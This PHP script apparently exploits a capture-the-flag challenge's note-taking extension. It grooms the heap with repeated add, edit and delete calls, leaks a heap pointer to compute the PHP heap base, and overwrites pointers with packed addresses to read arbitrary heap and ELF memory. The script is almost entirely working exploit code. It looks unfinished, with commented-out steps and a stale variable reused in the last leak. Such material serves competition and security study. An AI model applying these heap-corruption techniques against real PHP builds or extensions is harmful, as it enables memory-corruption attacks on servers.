<?php

function Substring($string, $start, $length = null) {
    $result = "";
    for ($i = $start; ($length === null || $i - $start < $length); $i++) {
        $result .= $string[$i];
    }
    return $result;
}
function u64($byteArray) {
    $integerValue = 0;
    for ($i = 7; $i >= 0; $i--) {
        $byteValue = ord($byteArray[$i]);
        $shift = ((7 - (7-$i) ) * 8);
        $integerValue += ($byteValue << $shift);
    }
    return $integerValue;
}

$payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
add_note("testXUELIAN0", $payload);
add_note("testXUELIAN0", $payload);
add_note("testXUELIAN0", $payload);
edit_note(2, $payload);
add_note("testXUELIAN0", $payload);
add_note("testXUELIAN0", $payload);
delete_note(3);

$payload = "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd";
add_note("testXUELIAN0", $payload);
delete_note(0);
delete_note(3);
$leak = view_note(4);
print($leak);
print("\n");
$leak = (Substring($leak, 0x40, 8));
$php_heapbase = u64($leak) - 0x57120;
/* $php_heapbase = u64($leak); */
print($php_heapbase);
print("\n");

$toleak = $php_heapbase + 0x2330 - 0x60;
$toleakELF = $php_heapbase + 0x4000 + 0x8;

$payload = "";
for ($i = 0; $i < 0x40; $i++) {
  $payload .= "a";
}
$payload .= pack("P", $toleak);
for ($i = 0; $i < 0x18; $i++) {
  $payload .= "a";
}
edit_note(4, $payload);
$payload = "";
for ($i = 0; $i < 0x58; $i++) {
  $payload .= "a";
}
$payload .= pack("P", $toleakELF);
add_note("testXUELIAN0", $payload);
add_note("lianliangz", $payload);

/* $payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadeadbbbb\x40"; */
/* edit_note(3, $payload);  */

$buffer = view_note(2);
print($buffer);
$leak = (Substring($leak, 0, 8));
print(u64($leak));

$buf_list = list_note();
/* for ($i = 0; $i < 32; $i++) { */
/*   print($buf_list[$i]); */
/*   print("\n"); */
/* } */

?>
